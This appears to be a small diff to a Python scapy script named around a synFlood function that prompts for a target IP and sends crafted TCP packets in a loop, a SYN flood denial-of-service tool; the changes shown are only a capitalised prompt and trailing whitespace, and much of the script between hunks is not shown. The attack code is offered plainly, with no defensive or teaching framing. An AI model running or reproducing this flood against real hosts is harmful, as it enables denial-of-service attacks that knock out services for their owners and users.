@@ -1,7 +1,7 @@
 import random
 from scapy.all import *
 
-target = input("target ip: ")
+target = input("Target ip: ")
 
 def synFlood(src,tgt):
     for window_size in range(1000,50000):
@@ -21,7 +21,7 @@ def synFlood(src,tgt):
     
     pkt = IPlayer / TCPlayer
     time.sleep(0.5)
-    send(pkt)
+    send(pkt) 
     
 tgt = str(target)
 
